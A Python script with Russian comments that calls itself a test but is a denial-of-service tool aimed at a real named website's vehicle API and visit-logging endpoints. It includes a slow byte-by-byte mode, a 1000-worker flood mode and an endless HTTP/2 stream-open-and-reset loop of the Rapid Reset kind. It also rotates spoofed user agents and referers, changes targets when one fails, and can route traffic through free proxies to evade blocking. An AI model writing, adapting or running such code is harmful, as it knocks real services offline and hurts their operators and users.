import os
import asyncio
import json
import random
import socket
import ssl
import sys
import time
import urllib.parse
import urllib.request
import uuid

from datetime import datetime, timezone

import aiohttp

from aiohttp_socks import ProxyConnector

try:
    import h2.connection as h2_connection  # type: ignore[import-not-found]
    import h2.config as h2_config  # type: ignore[import-not-found]
    from h2.errors import ErrorCodes  # type: ignore[import-not-found]
except ImportError:  # pragma: no cover - environment guard
    h2_connection = None
    h2_config = None
    ErrorCodes = None

# Список проверок: эндпоинты из примера скрипта
CHECKS = [
    [
        {"url": "http://beldeklarant.by/api/vehicles?limit=100000000000000000", "method": "GET", "ssl": False, "kind": "vehicles"},
        {"url": "http://beldeklarant.by/api/vehicles?limit=100000000000000000", "method": "GET", "ssl": False, "kind": "vehicles1"},
    ],[
        {"url": "http://beldeklarant.by/api/vehicles?vin=%D1%8B%D0%B2%D1%8C%D0%B0%D1%82%D1%8B%D0%B2%D0%B1%D1%82%D0%B0%D0%B1%D1%8B%D0%B2%D1%82%D0%B0%D0%BB%D0%B4%D1%83%D1%82%D1%82%D1%83%D0%B4%D1%86%D1%823%D0%B44%D0%BB%D0%B0%D1%82%D0%B4%D0%B0%D1%82%D0%B423%D1%824%D0%BE%D0%B4%D1%82%D0%B0%D0%BE%D0%B4%D0%B8%D0%BE%D0%B4%D0%B82%D0%BF%D0%B8%D0%BE2%D0%B8%D0%BF%D0%BE%D0%B42%D0%B83%D0%B4%D0%BF%D0%BE32%D0%B8%D0%BF%D0%BE%D0%B424%D0%B8%D1%80%D0%BF%D0%BE%D0%B6%D0%B8243%D0%BE%D0%B6%D0%BF2%D0%B84%D0%B6%D0%BE3%D0%B8%D0%B5%D0%B6%D0%BE42%D0%B83%D0%B6%D0%BE23%D0%B8%D0%B64%D0%BE%D0%B823%D0%BE%D0%B64%D0%B82%D0%BE3%D0%B64", "method": "GET", "ssl": False, "kind": "kilsearch"},
        {"url": "http://beldeklarant.by/api/vehicles?vin=%D1%8B%D0%B2%D1%8C%D0%B0%D1%82%D1%8B%D0%B2%D0%B1%D1%82%D0%B0%D0%B1%D1%8B%D0%B2%D1%82%D0%B0%D0%BB%D0%B4%D1%83%D1%82%D1%82%D1%83%D0%B4%D1%86%D1%823%D0%B44%D0%BB%D0%B0%D1%82%D0%B4%D0%B0%D1%82%D0%B423%D1%824%D0%BE%D0%B4%D1%82%D0%B0%D0%BE%D0%B4%D0%B8%D0%BE%D0%B4%D0%B82%D0%BF%D0%B8%D0%BE2%D0%B8%D0%BF%D0%BE%D0%B42%D0%B83%D0%B4%D0%BF%D0%BE32%D0%B8%D0%BF%D0%BE%D0%B424%D0%B8%D1%80%D0%BF%D0%BE%D0%B6%D0%B8243%D0%BE%D0%B6%D0%BF2%D0%B84%D0%B6%D0%BE3%D0%B8%D0%B5%D0%B6%D0%BE42%D0%B83%D0%B6%D0%BE23%D0%B8%D0%B64%D0%BE%D0%B823%D0%BE%D0%B64%D0%B82%D0%BE3%D0%B64", "method": "GET", "ssl": False, "kind": "kilsearch1"},
    ],[
        {"url": "https://beldeklarant.by/log-visit", "method": "POST", "ssl": False, "kind": "log_visit1"},
        {"url": "https://beldeklarant.by/log-visit", "method": "POST", "ssl": False, "kind": "log_visit2"},
    ],[
        {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": False, "kind": "vehicles_list"},
        {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": False, "kind": "vehicles_list1"},
    ]
]

MODE = "rapid"  # slow | flood | rapid
TARGET = 2


if len(sys.argv) > 1:
    requested_mode = sys.argv[1].strip().lower()
    if requested_mode in {"slow", "flood", "rapid"}:
        MODE = requested_mode

if MODE == "slow":
    TOTAL_REQUESTS = 100000000
    DELAY_BETWEEN_REQ = 0.5
    MAX_CONCURRENT = 500
    JITTER = 2.0
    BYTE_RATE_PER_SECOND = 1
elif MODE == "rapid":
    TOTAL_REQUESTS = 100000000
    DELAY_BETWEEN_REQ = 0.5
    MAX_CONCURRENT = 10
    JITTER = 2.0
    BYTE_RATE_PER_SECOND = None
else:
    TOTAL_REQUESTS = 100000000
    DELAY_BETWEEN_REQ = 0.05
    MAX_CONCURRENT = 1000
    JITTER = 1.0
    BYTE_RATE_PER_SECOND = None

USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 TV Safari/537.36",
    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 DMOST/1.0",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
]


def build_payload(request_num: int, worker_id: int, check_cfg: dict) -> dict:
    iso_string = datetime.now(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")

    base_payload = {
        "requestId": f"req-{request_num}-w{worker_id}-{uuid.uuid4().hex}",
        "page": f"/probe/{uuid.uuid4().hex[:12]}",
        "timestamp": iso_string,
        "userAgent": random.choice(USER_AGENTS),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "acceptLanguage": random.choice(["en-US,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8"]),
        "acceptEncoding": "gzip, deflate, br",
        "referer": random.choice(["https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/", "https://www.reddit.com/"]),
    }

    if check_cfg["kind"] == "log_visit":
        base_payload.update({
            "pageName": random.choice(["Главная", "ЗТК", "Контейнер", "ПТО"]),
            "event": "page_view",
            "screenWidth": random.randint(360, 1920),
            "screenHeight": random.randint(640, 1080),
        })
    elif check_cfg["kind"] == "vehicles_list":
        base_payload.update({
            "endpoint": "/api/vehicles",
            "limit": 10,
            "offset": random.randint(0, 100),
        })
    elif check_cfg["kind"] == "vehicles_vin":
        base_payload.update({
            "endpoint": "/api/vehicles",
            "vin": random.choice(["W1K2060431R001488", "JTEBR3FJ20K191488", "WVWZZZ1JZ3W123456"]),
        })

    return base_payload


request_counter = 0
success_count = 0
fail_count = 0
counter_lock = asyncio.Lock()


def get_check_cfg(request_num: int, target_index: int) -> dict:
    target_checks = CHECKS[target_index]
    return target_checks[(request_num - 1) % len(target_checks)]


def get_next_target_index() -> int:
    global TARGET
    current_target = TARGET
    TARGET = (TARGET + 1) % len(CHECKS)
    return current_target


def get_fallback_target_index() -> int:
    for idx, target_checks in enumerate(CHECKS):
        for check in target_checks:
            if isinstance(check, dict) and check.get("url"):
                return idx
    return 0


def rotate_target() -> int:
    global TARGET
    TARGET = (TARGET + 1) % len(CHECKS)
    return TARGET


async def run_rapid_http2_burst(check_cfg: dict, payload: dict) -> tuple[bool, str]:
    if h2_connection is None or h2_config is None or ErrorCodes is None:
        return False, "h2 package is required for rapid mode"

    parsed = urllib.parse.urlparse(check_cfg["url"])
    host = parsed.hostname or "localhost"
    if not host:
        return False, "empty host"
    try:
        socket.getaddrinfo(host, 443, proto=socket.IPPROTO_TCP)
    except socket.gaierror:
        fallback_idx = get_fallback_target_index()
        fallback_cfg = get_check_cfg(1, fallback_idx)
        if fallback_cfg.get("url"):
            check_cfg = fallback_cfg
            parsed = urllib.parse.urlparse(check_cfg["url"])
            host = parsed.hostname or "localhost"
            if not host:
                return False, "empty host"
        else:
            return False, "dns resolution failed"
    port = parsed.port or 443
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"

    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ssl_context, server_hostname=host),
            timeout=3.0,
        )
    except Exception as exc:
        return False, f"connect failed: {exc}"

    try:
        conn = h2_connection.H2Connection(config=h2_config.H2Configuration(client_side=True))
        conn.initiate_connection()
        writer.write(conn.data_to_send())
        await writer.drain()

        try:
            initial_data = await asyncio.wait_for(reader.read(65535), timeout=1.0)
        except asyncio.TimeoutError:
            initial_data = b""
        if initial_data:
            conn.receive_data(initial_data)

        headers = [
            (":method", check_cfg["method"].upper()),
            (":path", path),
            (":authority", host),
            (":scheme", "https"),
            ("user-agent", payload["userAgent"]),
            ("accept", payload["accept"]),
        ]

        inter = 0

        while True:
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(stream_id, headers, end_stream=False)
            conn.reset_stream(stream_id, error_code=ErrorCodes.CANCEL)

            writer.write(conn.data_to_send())
            inter += 1
            await writer.drain() 

    except Exception as exc:
        print(f"[-] ITER {inter} Rapid mode error: {exc}")
        return False, str(exc)
    finally:
        writer.close()
        await writer.wait_closed()


async def worker(session, worker_id):
    global request_counter, success_count, fail_count, TARGET

    while True:
        async with counter_lock:
            if request_counter >= TOTAL_REQUESTS:
                break
            request_counter += 1
            current_request_num = request_counter
            current_target = get_next_target_index()

        check_cfg = get_check_cfg(current_request_num, current_target)
        payload = build_payload(current_request_num, worker_id, check_cfg)

        try:
            start_time = time.time()
            body = json.dumps(payload, ensure_ascii=False)

            if MODE == "slow":

                # Запоминаем время начала отправки всей последовательности байт
                start_time = time.time()

                for idx, char in enumerate(body):
                    chunk = char.encode("utf-8")
                    
                    try:
                        async with session.request(
                            check_cfg["method"],
                            check_cfg["url"],
                            data=chunk,
                            timeout=5,
                            ssl=check_cfg["ssl"],
                        ) as response:
                            duration = time.time() - start_time
                            
                            if response.status in (200, 201):
                                print(
                                    f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
                                    f" (Цель: {current_target}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с, байт {idx + 1})"
                                )
                                async with counter_lock:
                                    success_count += 1
                            elif response.status in (429, 403):
                                print(
                                    f"[!] Запрос {current_request_num} (Воркер {worker_id}):"
                                    f" Сервер вернул код {response.status} для {current_target}. Возможна блокировка."
                                )
                                async with counter_lock:
                                    fail_count += 1
                                break
                            else:
                                print(
                                    f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
                                    f" Сервер вернул код {response.status} для {current_target}"
                                )
                                async with counter_lock:
                                    fail_count += 1
                                    
                    except Exception as e:
                        print(f"[-] Ошибка соединения для воркера {worker_id}: {e}")
                        async with counter_lock:
                            fail_count += 1
                            
                    await asyncio.sleep(1.0 / BYTE_RATE_PER_SECOND)

                for idx, char in enumerate(body):
                    chunk = char.encode("utf-8")
                    async with session.request(
                        check_cfg["method"],
                        check_cfg["url"],
                        data=chunk,
                        timeout=5,
                        ssl=check_cfg["ssl"],
                    ) as response:
                        duration = time.time() - start_time
                        if response.status in (200, 201):
                            print(
                                f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
                                f" (Цель: {current_target}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с, байт {idx + 1})"
                            )
                            async with counter_lock:
                                success_count += 1
                        else:
                            print(
                                f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
                                f" Сервер вернул код {response.status} для {current_target}"
                            )
                            async with counter_lock:
                                fail_count += 1
                    await asyncio.sleep(1.0 / BYTE_RATE_PER_SECOND)
            elif MODE == "rapid":
                try:
                    ok, detail = await run_rapid_http2_burst(check_cfg, payload)
                    duration = time.time() - start_time
                    if ok:
                        print(
                            f"[+] Запрос {current_request_num} (Воркер {worker_id}): HTTP/2 rapid burst OK"
                            f" (Цель: {current_target}, Метод: {check_cfg['method']}, Время: {duration:.3f}с, Детали: {detail})"
                        )
                        async with counter_lock:
                            success_count += 1
                    else:
                        print(
                            f"[-] Запрос {current_request_num} (Воркер {worker_id}): HTTP/2 rapid burst failed"
                            f" (Цель: {current_target}, Детали: {detail})"
                        )
                        async with counter_lock:
                            fail_count += 1
                except Exception as exc:
                    async with counter_lock:
                        fail_count += 1
                    print(
                        f"[-] Запрос {current_request_num} (Воркер {worker_id}): rapid mode error: {exc}"
                    )
            else:
                async with session.request(
                    check_cfg["method"],
                    check_cfg["url"],
                    json=payload,
                    timeout=5,
                    ssl=check_cfg["ssl"],
                ) as response:
                    duration = time.time() - start_time
                    if response.status in (200, 201):
                        print(
                            f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
                            f" (Цель: {current_target}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с)"
                        )
                        async with counter_lock:
                            success_count += 1
                    else:
                        print(
                            f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
                            f" Сервер вернул код {response.status} для {current_target}"
                        )
                        async with counter_lock:
                            fail_count += 1
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            async with counter_lock:
                fail_count += 1
                next_target = rotate_target()
            print(
                f"[!] Запрос {current_request_num} (Воркер {worker_id}): Ошибка соединения"
                f" ({e}) для {current_target}. Смена цели -> {next_target}"
            )

        sleep_for = DELAY_BETWEEN_REQ + random.uniform(0, JITTER)
        await asyncio.sleep(sleep_for)

def get_random_free_proxy():
    """Скачивает свежий список прокси из ProxyScrape и возвращает один случайный IP:PORT"""
    url = "https://jsdelivr.net"
    try:
        print("[*] Запрашиваем свежий пул бесплатных прокси из ProxyScrape...")
        # Скачиваем текстовый файл напрямую через urllib (чтобы не плодить асинхронные сессии раньше времени)
        with urllib.request.urlopen(url, timeout=10) as response:
            content = response.read().decode('utf-8')
            
        # Разбиваем текст на строки и убираем пустые
        proxies = [line.strip() for line in content.splitlines() if line.strip()]
        
        if proxies:
            selected = random.choice(proxies)
            print(f"[+] Успешно получен случайный прокси из пула ({len(proxies)} шт.): {selected}")
            return selected
        else:
            print("[!] Список прокси оказался пустым!")
            return None
    except Exception as e:
        print(f"[!] Не удалось автоматически загрузить прокси: {e}")
        return None

async def main():
    print("[*] Запуск асинхронного теста")
    print(f"[*] Режим: {MODE}")
    print(f"[*] Целей для проверки: {len(CHECKS)}")
    print(f"[*] Всего запросов: {TOTAL_REQUESTS}, Одновременных воркеров: {MAX_CONCURRENT}\n")
    
    proxy_raw = None
    proxy_source = ""

    # 1. Приоритет 1: Ищем готовый адрес в переменных окружения Docker
    if os.getenv("PROXY_URL"):
        proxy_raw = os.getenv("PROXY_URL")
        proxy_source = "Окружение (Docker)"

    # 2. Приоритет 2: Если в ENV пусто, но в аргументах передано именно слово "proxy"
    elif len(sys.argv) >= 3 and sys.argv[2].lower() == "proxy":
        proxy_source = "Авто-подгрузка (маркер 'proxy')"
        proxy_raw = get_random_free_proxy()

    # 3. Инициализируем коннектор
    if not proxy_raw:
        print("[*] Работаем НАПРЯМУЮ без прокси.")
        connector = aiohttp.TCPConnector(use_dns_cache=True, ttl_dns_cache=3)
    else:
        # Форматируем строку (добавляем http:// для чистых IP:PORT)
        proxy_url = proxy_raw if "://" in proxy_raw else f"http://{proxy_raw}"
        print(f"[*] Источник: {proxy_source}")
        print(f"[*] Все воркеры используют адрес: {proxy_url}")
        
        connector = ProxyConnector.from_url(
            proxy_url,
            use_dns_cache=True,
            ttl_dns_cache=3
        )

    # 4. Запуск сессии и воркеров (без изменений)
    async with aiohttp.ClientSession(connector=connector) as session:
        workers = [
            asyncio.create_task(worker(session, worker_id))
            for worker_id in range(1, MAX_CONCURRENT + 1)
        ]
        await asyncio.gather(*workers)

    print("\n--- Итоги тестирования ---")
    print(f"Успешных запросов: {success_count}")
    print(f"Ошибок/сбоев: {fail_count}")

if __name__ == "__main__":
    import sys

    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    asyncio.run(main())
